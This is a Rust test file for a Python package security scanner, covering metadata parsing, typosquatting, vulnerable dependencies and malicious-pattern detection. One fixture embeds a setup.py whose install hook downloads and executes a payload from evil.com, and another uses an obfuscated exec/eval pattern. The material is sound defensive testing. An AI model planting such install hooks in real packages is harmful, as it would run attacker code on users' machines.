#![allow(
    clippy::case_sensitive_file_extension_comparisons,
    clippy::cast_possible_truncation,
    clippy::cast_possible_wrap,
    clippy::cast_precision_loss,
    clippy::cast_sign_loss,
    clippy::collection_is_never_read,
    clippy::field_reassign_with_default,
    clippy::format_push_string,
    clippy::float_cmp,
    clippy::if_not_else,
    clippy::ignore_without_reason,
    clippy::items_after_statements,
    clippy::iter_on_single_items,
    clippy::large_futures,
    clippy::large_stack_arrays,
    clippy::large_stack_frames,
    clippy::manual_assert_eq,
    clippy::manual_let_else,
    clippy::match_same_arms,
    clippy::match_wildcard_for_single_variants,
    clippy::needless_collect,
    clippy::needless_pass_by_ref_mut,
    clippy::needless_pass_by_value,
    clippy::no_effect_underscore_binding,
    clippy::option_if_let_else,
    clippy::ref_option,
    clippy::redundant_clone,
    clippy::redundant_pattern_matching,
    clippy::self_only_used_in_recursion,
    clippy::significant_drop_tightening,
    clippy::single_match_else,
    clippy::single_option_map,
    clippy::too_many_lines,
    clippy::trivially_copy_pass_by_ref,
    clippy::unnecessary_debug_formatting,
    clippy::unreadable_literal,
    clippy::unused_async,
    clippy::unused_self,
    clippy::used_underscore_binding,
    clippy::useless_let_if_seq,
    clippy::wildcard_enum_match_arm,
    clippy::ignored_unit_patterns
)]

use file_scanner::python_analysis::{analyze_python_package, RiskLevel};
use file_scanner::python_vuln_db::{check_typosquatting_similarity, get_known_malicious_packages};
use std::fs;
use std::path::Path;
use tempfile::TempDir;

#[test]
fn test_analyze_python_directory_with_setup_py() {
    let temp_dir = TempDir::new().unwrap();
    let setup_py_path = temp_dir.path().join("setup.py");

    let setup_py_content = r#"
from setuptools import setup, find_packages

setup(
    name="test-package",
    version="1.0.0",
    description="A test package",
    author="Test Author",
    author_email="test@example.com",
    license="MIT",
    url="https://github.com/test/test-package",
    install_requires=[
        "requests>=2.28.0",
        "flask==2.2.0",
        "numpy<1.20.0",
    ],
    extras_require={
        "dev": ["pytest>=7.0.0", "black>=22.0.0"],
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
    ],
)
"#;

    fs::write(&setup_py_path, setup_py_content).unwrap();

    let result = analyze_python_package(temp_dir.path()).unwrap();

    assert_eq!(result.package_info.name, "test-package");
    assert_eq!(result.package_info.version, "1.0.0");
    assert_eq!(
        result.package_info.description.as_deref(),
        Some("A test package")
    );
    assert_eq!(result.package_info.author.as_deref(), Some("Test Author"));
    assert_eq!(result.package_info.license.as_deref(), Some("MIT"));

    // Check dependencies
    assert_eq!(result.dependencies.install_requires.len(), 3);
    assert!(result
        .dependencies
        .install_requires
        .contains_key("requests"));
    assert!(result.dependencies.install_requires.contains_key("flask"));
    assert!(result.dependencies.install_requires.contains_key("numpy"));
}

#[test]
fn test_analyze_python_directory_with_pyproject_toml() {
    let temp_dir = TempDir::new().unwrap();
    let pyproject_path = temp_dir.path().join("pyproject.toml");

    let pyproject_content = r#"
[tool.poetry]
name = "test-poetry-package"
version = "2.0.0"
description = "A test Poetry package"
authors = ["Poetry Author <poetry@example.com>"]

[tool.poetry.dependencies]
python = "^3.9"
requests = "^2.31.0"
pandas = "^2.0.0"

[tool.poetry.group.dev.dependencies]
pytest = "^7.3.0"
mypy = "^1.3.0"
"#;

    fs::write(&pyproject_path, pyproject_content).unwrap();

    let result = analyze_python_package(temp_dir.path()).unwrap();

    assert_eq!(result.package_info.name, "test-poetry-package");
    assert_eq!(result.package_info.version, "2.0.0");
    assert_eq!(
        result.package_info.description.as_deref(),
        Some("A test Poetry package")
    );
}

#[test]
fn test_analyze_python_directory_with_setup_cfg() {
    let temp_dir = TempDir::new().unwrap();
    let setup_cfg_path = temp_dir.path().join("setup.cfg");

    let setup_cfg_content = r"
[metadata]
name = test-setuptools-package
version = 3.0.0
description = A test setuptools package
author = Setuptools Author
author_email = setuptools@example.com
license = Apache-2.0
url = https://example.com/test-package

[options]
packages = find:
python_requires = >=3.8
install_requires =
    click>=8.0
    pydantic>=2.0
    httpx>=0.24.0
";

    fs::write(&setup_cfg_path, setup_cfg_content).unwrap();

    let result = analyze_python_package(temp_dir.path()).unwrap();

    assert_eq!(result.package_info.name, "test-setuptools-package");
    assert_eq!(result.package_info.version, "3.0.0");
    assert_eq!(
        result.package_info.author.as_deref(),
        Some("Setuptools Author")
    );
    assert_eq!(result.dependencies.install_requires.len(), 3);
}

#[test]
fn test_malicious_package_detection() {
    let temp_dir = TempDir::new().unwrap();
    let setup_py_path = temp_dir.path().join("setup.py");

    // Create a suspicious setup.py with dangerous operations
    let malicious_setup_py = r#"
import os
import subprocess
import urllib.request

from setuptools import setup
from setuptools.command.install import install

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        # Suspicious: downloading external content
        urllib.request.urlopen("http://evil.com/malware.py")
        # Suspicious: executing system commands
        subprocess.run(["curl", "http://evil.com/data", "-o", "/tmp/data"])
        os.system("chmod +x /tmp/data && /tmp/data")

setup(
    name="colourama",  # Typosquatting colorama
    version="0.4.5",
    description="Cross-platform colored terminal text",
    install_requires=[
        "requests",
        "crypto",  # Suspicious: should be cryptography
    ],
    cmdclass={
        'install': PostInstallCommand,
    },
)
"#;

    fs::write(&setup_py_path, malicious_setup_py).unwrap();

    let result = analyze_python_package(temp_dir.path()).unwrap();

    // Check security analysis
    assert!(result.security_analysis.has_setup_script);
    assert!(result.security_analysis.has_install_script);
    assert!(!result.setup_analysis.dangerous_operations.is_empty());
    assert!(!result.setup_analysis.external_downloads.is_empty());

    // Check malicious indicators
    assert!(
        result
            .malicious_indicators
            .typosquatting_risk
            .is_potential_typosquatting
    );
    assert!(!result
        .malicious_indicators
        .known_malicious_patterns
        .is_empty());
    assert!(result.malicious_indicators.overall_risk_score > 50.0);
    assert!(matches!(
        result.malicious_indicators.risk_level,
        RiskLevel::High | RiskLevel::Critical
    ));
}

#[test]
fn test_typosquatting_detection() {
    // Test known typosquatting patterns
    let typo_names = vec![
        "colourama",       // colorama
        "python-dateutil", // python-dateutil (correct name)
        "beautifulsoup",   // beautifulsoup4
        "pytorch",         // torch
        "sklearn",         // scikit-learn
        "django-rest",     // djangorestframework
    ];

    for name in &typo_names {
        let similar = check_typosquatting_similarity(name);
        // Some of these are known malicious packages but not necessarily similar to popular ones
        if name == &"colourama" || name == &"beautifulsoup" {
            assert!(
                similar.is_some(),
                "Expected {name} to be detected as typosquatting"
            );
        }
    }
}

#[test]
fn test_known_malicious_packages() {
    let malicious = get_known_malicious_packages();

    // Check that some known malicious packages are in the list
    assert!(malicious.contains(&"colourama"));
    assert!(malicious.contains(&"python-sqlite"));
    assert!(malicious.contains(&"setup-tools")); // typosquatting setuptools
    assert!(malicious.contains(&"urllib")); // should be urllib3
}

#[test]
fn test_vulnerability_detection() {
    let temp_dir = TempDir::new().unwrap();
    let setup_py_path = temp_dir.path().join("setup.py");

    // Create setup.py with vulnerable dependencies
    let vulnerable_setup_py = r#"
from setuptools import setup

setup(
    name="vulnerable-package",
    version="1.0.0",
    install_requires=[
        "django==3.2.0",     # Known vulnerable version
        "flask==2.2.0",      # Known vulnerable version
        "pyyaml==5.3.1",     # CVE-2020-14343
        "requests==2.25.0",  # Old vulnerable version
    ],
)
"#;

    fs::write(&setup_py_path, vulnerable_setup_py).unwrap();

    let result = analyze_python_package(temp_dir.path()).unwrap();

    // Check vulnerability summary
    assert!(result.dependencies.vulnerability_summary.total_count > 0);
    assert!(!result
        .dependencies
        .vulnerability_summary
        .vulnerable_packages
        .is_empty());
}

#[test]
fn test_dependency_confusion_detection() {
    let temp_dir = TempDir::new().unwrap();
    let setup_py_path = temp_dir.path().join("setup.py");

    // Create setup.py with internal-looking package names
    let internal_setup_py = r#"
from setuptools import setup

setup(
    name="internal-analytics",
    version="1.0.0",
    description="Internal analytics package",
    install_requires=[
        "requests",
        "company-auth-lib",
        "private-utils",
    ],
)
"#;

    fs::write(&setup_py_path, internal_setup_py).unwrap();

    let result = analyze_python_package(temp_dir.path()).unwrap();

    // Should detect dependency confusion risk
    assert!(result.malicious_indicators.dependency_confusion_risk);
}

#[test]
fn test_quality_metrics() {
    let temp_dir = TempDir::new().unwrap();

    // Create a well-structured package
    fs::write(
        temp_dir.path().join("setup.py"),
        "from setuptools import setup\nsetup(name='quality-test', version='1.0.0')",
    )
    .unwrap();
    fs::write(temp_dir.path().join("README.md"), "# Quality Test Package").unwrap();
    fs::write(temp_dir.path().join("CHANGELOG.md"), "## Version 1.0.0").unwrap();
    fs::create_dir(temp_dir.path().join("tests")).unwrap();
    fs::write(
        temp_dir.path().join("tests/test_main.py"),
        "def test_example(): pass",
    )
    .unwrap();
    fs::create_dir_all(temp_dir.path().join(".github/workflows")).unwrap();
    fs::write(
        temp_dir.path().join(".github/workflows/test.yml"),
        "name: Test",
    )
    .unwrap();
    fs::write(temp_dir.path().join("py.typed"), "").unwrap();

    let result = analyze_python_package(temp_dir.path()).unwrap();

    assert!(result.quality_metrics.has_readme);
    assert!(result.quality_metrics.has_changelog);
    assert!(result.quality_metrics.has_tests);
    assert!(result.quality_metrics.has_ci_config);
    assert!(result.quality_metrics.has_type_hints);
    assert!(result.quality_metrics.overall_quality_score > 70.0);
}

#[test]
fn test_code_injection_detection() {
    let temp_dir = TempDir::new().unwrap();
    let setup_py_path = temp_dir.path().join("setup.py");

    // Create setup.py with code injection patterns
    let injection_setup_py = r#"
import base64

from setuptools import setup

# Suspicious: obfuscated code
exec(base64.b64decode(b'cHJpbnQoIkhlbGxvIik='))

# Suspicious: eval usage
config = eval(open('config.txt').read())

setup(
    name="injection-test",
    version="1.0.0",
)
"#;

    fs::write(&setup_py_path, injection_setup_py).unwrap();

    let result = analyze_python_package(temp_dir.path()).unwrap();

    // Should detect code injection patterns
    assert!(!result.security_analysis.suspicious_imports.is_empty());
    assert!(
        result.security_analysis.obfuscation_detected
            || !result
                .malicious_indicators
                .code_injection_patterns
                .is_empty()
    );
}

#[test]
fn test_error_handling() {
    // Test with non-existent path
    let result = analyze_python_package(Path::new("/non/existent/path"));
    assert!(result.is_err());

    // Test with empty directory (no setup files)
    let temp_dir = TempDir::new().unwrap();
    let result = analyze_python_package(temp_dir.path());
    assert!(result.is_err());

    // Test with invalid file type
    let temp_dir = TempDir::new().unwrap();
    let invalid_file = temp_dir.path().join("test.txt");
    fs::write(&invalid_file, "not a python package").unwrap();
    let result = analyze_python_package(&invalid_file);
    assert!(result.is_err());
}
